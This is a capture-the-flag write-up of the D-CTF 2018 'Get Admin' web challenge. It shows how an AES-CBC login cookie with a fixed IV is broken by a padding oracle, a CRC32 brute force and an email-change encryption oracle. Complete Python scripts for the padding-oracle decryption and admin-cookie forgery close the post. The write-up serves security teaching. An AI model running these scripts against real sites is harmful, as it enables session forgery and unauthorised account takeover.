---
layout: post
title: "D-CTF Quals 2018: Get Admin"
author: exo
categories: writeup
tags: [cat/web, cat/crypto]
---

* **Category:** web
* **Points:** 220
* **Description:**

> This is a very unexpected gig for me. However, I'm busy with other projects
> so can you please give me a hand to test this. For free, of course. :-)
>
> Files: [https://dctf.def.camp/dctf-18-quals-81249812/get-admin.zip](https://dctf.def.camp/dctf-18-quals-81249812/get-admin.zip)
> Target: [https://admin.dctfq18.def.camp/](https://admin.dctfq18.def.camp/)
>
> Author: Andrei

## Writeup

A web challenge in php and we even get the source code! So let's start to
analyze the app.

We have the usual scheme of interaction: We can register, login and after that
we are redirected to `/admin.php`, where we would get the flag:

```php
if($_SESSION['userid'] === "1") {
    echo FLAG;
} else {
    echo 'Try harder.';
}
```

So how do the registration work? This part is very straight forward.
The username, password and email are sent to "Authlib":

```php
$response =  $auth->createUser($_POST['username'],$_POST['password'], $_POST['email']);
```

After that, prepared statements are correctly used to insert the user into
the database. So nothing vulnerable there.

The next thing to take a look at is the login. This is handled in `index.php`:

```php
include_once('config.php');

if (!isset($_SESSION['userid'])) {
    if(!empty($_COOKIE['user'])) {
        $u = decryptCookie($_COOKIE['user']);

        if($u['id'] > 0) {
            $_SESSION['userid'] = $u['id'];
            header("Location: /admin.php");
            exit;
        }
        die('Invalid cookie.');
    } else if(isset($_POST['username'], $_POST['password'])) {
        $auth = new AuthLib($db);
        $userid = (int) $auth->authenticate($_POST['username'], $_POST['password']);
        if ($userid) {
            $q = $db->query('SELECT * FROM `users` where id='.$userid);
            $row = $q->fetch(\PDO::FETCH_ASSOC);

            $_SESSION['userid'] = $userid;

            setcookie('user',encryptCookie([
                'id' => $userid,
                'username' => $_POST['username'],
                'email' => $row['email'],
            ]), time()+60*60*24*30);

            header("Location: /admin.php");
            exit;
        }
    }
    require_once('login.php');
} else {
    require_once('admin.php');
}
```

We can see that there are actually two possibilities to login.
One way is via the form using username and password.
This sets the `user` cookie, which can be used to login another time instead
of providing username and password.
So if we can forge a cookie with a `userid` of 1, we are done.

### Encryption

The cookie is actually encrypted, so we analyze that:

```php
function encryptCookie($arr) {
    $cookie = compress($arr);
    $arr['checksum'] = crc32($cookie);
    return encrypt(compress($arr), AES_KEY, AES_IV);
}

function compress($arr) {
    return implode('÷', array_map(function ($v, $k) { return $k.'¡'.$v; }, $arr, array_keys($arr) ));
}

function encrypt($plaintext, $key, $iv) {
    $length     = strlen($plaintext);
    $ciphertext = openssl_encrypt($plaintext, 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($ciphertext) . sprintf('%06d', $length);
}
```

First `encryptCookie` is called with our `$userid` (coming from the database),
our username (that we chose), and the email address already stored in the
database. This is passed as a PHP named array to `compress`, which actually just
concatenates the array using the two byte long Unicode characters `÷` (`\xc2\xa1`)
and `¡` (`\xc3\xb7`) as separators.

Then the CRC32 of the result is calculated and set as another entry in the
array. The resulting array is encoded again and then this string is fed into
AES-128-CBC. Note that the IV that is used is a PHP constant and is the same
for every encryption. The result of the AES encryption is then byse64 encoded.
Lastly a 6 character `$length` is appended in plaintext and the result is set
as the `user` cookie.

Due to the reuse of the IV, we get deterministic results when logging in
multiple times. We however cannot decrypt our own cookie and therefore do not
know our `id` and `checksum`.

### Decryption

Next we take a look at how the cookie is being interpreted when we use it to
login.

```php
function decryptCookie($cypher) {
    return decompress(decrypt($cypher, AES_KEY, AES_IV));
}

function decrypt($ciphertext, $key, $iv) {
    $length     = intval(substr($ciphertext, -6, 6));
    $ciphertext = substr($ciphertext, 0,-6);
    $output     = openssl_decrypt(base64_decode($ciphertext), 'AES-128-CBC', $key, OPENSSL_RAW_DATA, $iv);
    if($output == FALSE) {
        echo('Decryption error (0).');
        die();
    }
    return substr($output, 0, $length);
}

function decompress($cookie) {
    if(preg_match('/[^\x00-\x7F]+\ *(?:[^\x00-\x7F]| )*/im',$cookie, $m) == 0) {
        echo('Decryption error (1).');
        return false;
    }

    $t = explode("÷", $cookie);

    $arr = [];
    foreach($t as $el) {
        $el = explode("¡", $el);
        $arr[$el[0]] = $el[1];
    }

    if(!isset($arr['checksum'])) {
        echo('Decryption error (2).');
        return false;
    }

    $checksum = intval($arr['checksum']);
    unset($arr['checksum']);
    $cookie = compress($arr);
    if($checksum != crc32($cookie)) {
        echo('Decryption error (3).');
        return false;
    }

    return $arr;
}
```

So our cookie is first AES-CBC decrypted.
If tis operation fails, we get the `'Decryption error (0).'`.
This is the only time we get this specific error message and the only way
for the decryption to fail in this phase is if the padding at the end of
the last block is incorrect.

This means we have a padding oracle, which we can use to decrypt our cookie.
There is a nice library called
[python-paddingoracle](https://github.com/mwielgoszewski/python-paddingoracle)
that implements a standard padding oracle attack.
We only need to implement the oracle part via python requests.
To do so, we modified the example code from the readme file:

```python
[...]
from paddingoracle import BadPaddingException, PaddingOracle

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        user_cookie = quote(b64encode(data)) + "000071"
        self.session.cookies['user'] = user_cookie
        while True:
            try:
                response = self.session.get('https://admin.dctfq18.def.camp',
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)

        self.history.append(response)

        if "Decryption error (0)." in response.text:
            raise BadPaddingException

        print('No padding exception raised on %r'% user_cookie)

encrypted_cookie = unquote("USVx0XaRKUqRjovB1%2BLShzc4Cj7G4s5Iyk9Rx%2BCmi7vBRVeinUtxW7vPekFMQjsw%2BlYqkHtc1R9oJoOBs0KAXZ6zbGkzs3HthZBWxX%2FlAvY%3D000071")
aes_part = b64decode(encrypted_cookie[:-6])
len_str = encrypted_cookie[-6:]
padbuster = PadBuster()
cookie = padbuster.decrypt(aes_part, block_size=AES.block_size, iv=bytearray(8))
print(cookie)
```

Now we are able to decrypt our own cookie byte by byte. The result is:

```python
b'".\x83\xf2xx~\x89\xe44?.4$*,e\xc2\xa1asdfasdf\xc3\xb7email\xc2\xa1yxcv@yxcv.com\xc3\xb7checksum\xc2\xa11467050118\t\t\t\t\t\t\t\t\t'
```

We can see that the decryption succeeded except for the first block.
This is because we do not know the IV that was XORed to it during encryption.
Because we know the structure of the plaintext, we are however able to recover
parts of the IV.

Except for our `id`, we know the first block of the plaintext must be:

```python
'id\xc2\xa1???\xc3\xb7usernam'
```

XORed with the first block of the padding oracle result, this gives us the IV
(except for the three unknown characters where our id is):

```
KJAS???JSALKFJKA
```

So the IV does only consist of uppercase letters.
The three remaining unknown bytes are our `id`. We can brute force that using
the checksum to verify our result. For some reason this did not work in python
so we implemented in in PHP (which would have been less work anyway):

```php
for ($i = 0; $i < 1000; $i++) {
  $arr = [
      'id' => strval($i),
      'username' => "asdfasdf",
      'email' => "yxcv@yxcv.com",
  ];
  $mycrc = crc32(compress($arr));
  if (1467050118 == $mycrc) {
  print("id: " . $i . "\n");
  }
}
```

We now know our `id` (438), so we can recover the rest of the IV using XOR:

```
KJASLKFJSALKFJKA
```

As it turns out, it was not required to recover the IV to solve the challenge,
but it was fun anyway :)

### Forging the cookie

We can calculate the CRC ourselves in PHP:

```php
$arr = [
    'id' => "1",
    'username' => "admin",
    'email' => 'admin@admin.com'
];
$compr = compress($arr);
$mycrc = crc32(compress($arr));
$arr['checksum'] = strval($mycrc);
print("crc: " . $mycrc . "\n");
```

To become admin we must forge a cookie where the `id` is 1. This would look
like this:

```python
'id\xc2\xa11\xc3\xb7username\xc2\xa1admin\xc3\xb7email\xc2\xa1admin@admin.com\xc3\xb7checksum\xc2\xa1197680336'
```

It is not possible to just flip bits to change the checksum and append
`id\xc2\xa11` in the last block because the result is checked to have a valid
checksum for the plaintext (which we do not )

But our `id` is different for every user we create, so all following blocks will
be XORed with something we do not control. Conveniently there is a profile page
that lets us change our email address at a later time. This gives us an
encryption oracle if we use the properties of AES-CBC to our advantage.

During encryption, the blocks are encrypted as follows:

```
c1 = AES(p1 XOR IV)
c2 = AES(p2 XOR c1)
c3 = AES(p3 XOR c2)
...
```

We can login with an email address that fills up an entire block (`p3`). This
gives us the ciphertext (`c2`) that is XORed to `p3` before encryption. Then we
XOR the bock we want to encrypt (`t`) with `c2` and change our email address to
that. When we login again, we get:

```
c1 = AES(p1 XOR IV)
c2 = AES(p2 XOR c1)
c3' = AES((t XOR c2) XOR c2) = AES(t)
...
```

We have now successfully encrypted the block `t` and can get the result in
`c3'`.

This attack would not have required us to recover the IV, since we can just
replace blocks in our existing cookie. But we already had the IV, so we can
create an entirely new cookie.

We wrote a python script to implement this attack, which gave us our forged
cookie:

```
OJe3wWiYjywazHw%2BjDOfjfY%2B8N5G8jYXL680EaNwrFVzIUHOM4%2BNd11Y5B%2Fxv3%2FnI5EBB5GaT67Ikn9XKLMbJ2hTuSfT3COIWlr0T1bv1Go%3D000067
```

After creating the cookie, all we need to do is login and retrieve the flag:
```
DCTF{4EF853DFC818AFEC39497CD1B91625F9E6E19D34D8E43E56722026F26A95F13E}
```

## Summary

It was a nice crypto challenge (even though it was flagged as web) and I
learned a lot. In hindsight, the entire padding oracle would not have been
necessary. It made the encryption oracle a lot easier though.

## Files

### padding_oracle.py

```python
from base64 import b64encode, b64decode
from urllib import quote, unquote, quote_plus
import requests
import socket
import time
import binascii
import logging
import sys
import urllib3
from Crypto.Cipher import AES
from paddingoracle import BadPaddingException, PaddingOracle

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)
        self.session = requests.Session()
        self.wait = kwargs.get('wait', 2.0)

    def oracle(self, data, **kwargs):
        user_cookie = quote(b64encode(data)) + "000071"
        self.session.cookies['user'] = user_cookie
        while True:
            try:
                response = self.session.get('https://admin.dctfq18.def.camp',
                        stream=False, timeout=5, verify=False)
                break
            except (socket.error, requests.exceptions.RequestException):
                logging.exception('Retrying request in %.2f seconds...',
                                  self.wait)
                time.sleep(self.wait)

        self.history.append(response)

        if "Decryption error (0)." in response.text:
            raise BadPaddingException

        print('No padding exception raised on %r'% user_cookie)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger().setLevel(logging.INFO)
logging.basicConfig(level=logging.INFO)

encrypted_cookie = unquote("USVx0XaRKUqRjovB1%2BLShzc4Cj7G4s5Iyk9Rx%2BCmi7vBRVeinUtxW7vPekFMQjsw%2BlYqkHtc1R9oJoOBs0KAXZ6zbGkzs3HthZBWxX%2FlAvY%3D000071")
aes_part = b64decode(encrypted_cookie[:-6])
len_str = encrypted_cookie[-6:]
padbuster = PadBuster()
cookie = padbuster.decrypt(aes_part, block_size=AES.block_size, iv="KJASLKFJSALKFJKA")
print(cookie)
```

### forge_cookie.py

```python
from base64 import b64encode, b64decode
from urllib import quote, unquote, quote_plus
import requests
import socket
import time
import binascii
import logging
import sys
import urllib3
from Crypto.Cipher import AES

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DOMAIN = "https://admin.dctfq18.def.camp"

def register(s, user, passw, email):
    return s.post(DOMAIN + "/register.php", data={"confirm_password": passw, "email": email, "password": passw, "username": user})

def login(s, user, passw):
    res = s.post(DOMAIN + "/", data={"username": user, "password": passw, "lg_remember": "on"})
    assert("Admin</div>" in res.text)
    return res

def changeEmail(s, user, passw, email):
    s.post(DOMAIN + "/profile.php", data={"confirm_password": passw, "email": email, "password": passw, "username": user})
    s = requests.session()
    res = login(s, user, passw)
    print(res)
    print(res.text)
    return res

def getCookie(user, passw):
    s = requests.session()
    res = login(s, user, passw)
    return s.cookies['user']

def decodeCookie(cookie):
    un_cookie = unquote(cookie)
    return (b64decode(un_cookie[:-6]), un_cookie[-6:])

def blocks(chain):
    cnt = len(chain) / 16
    return [chain[16*i:16*(i+1)] for i in range(cnt)]

def xor(a, b):
    return ''.join(chr(ord(x)^ord(y)) for x,y in zip(a, b))

def pad(x):
    plen = 16-len(x)%16
    return chr(plen) * plen

def getPreblock():
    s = requests.session()
    res = login(s, user, passw)
    changeEmail(s, user, passw, mail_start + "a"*16)
    cookie = getCookie(user, passw)
    aes_part, len_str = decodeCookie(cookie)

    print([binascii.hexlify(x) for x in blocks(aes_part)])
    pre_block = blocks(aes_part)[2]
    return pre_block


IV = "KJASLKFJSALKFJKA"
user = "asdfqwer"
passw = "hacker1"
mail_start = "wodq@ycws.aw"

target_cookie = "id\xc2\xa11\xc3\xb7username\xc2\xa1admin\xc3\xb7email\xc2\xa1admin@admin.com\xc3\xb7checksum\xc2\xa1197680336"

target_cookie = target_cookie + pad(target_cookie)

s = requests.session()
res = register(s, user, passw, mail_start)

target_blocks = blocks(target_cookie)
pre_block = getPreblock()
last_ct_block = IV

ct_blocks = []
for target_block in target_blocks:
    submission = xor(target_block, pre_block)
    submission = xor(submission, last_ct_block)
    res = login(s, user, passw)
    changeEmail(s, user, passw, mail_start + submission)
    cookie = getCookie(user, passw)
    aes_part, len_str = decodeCookie(cookie)

    print([binascii.hexlify(x) for x in blocks(aes_part)])

    ct_block = blocks(aes_part)[3]
    last_ct_block = ct_block
    ct_blocks.append(ct_block)

ct_chain = ''.join(ct_blocks)

fin_cookie = quote_plus(b64encode(ct_chain)) + "%06d"%(len(target_cookie) - ord(target_cookie[-1]))
print(fin_cookie)
```
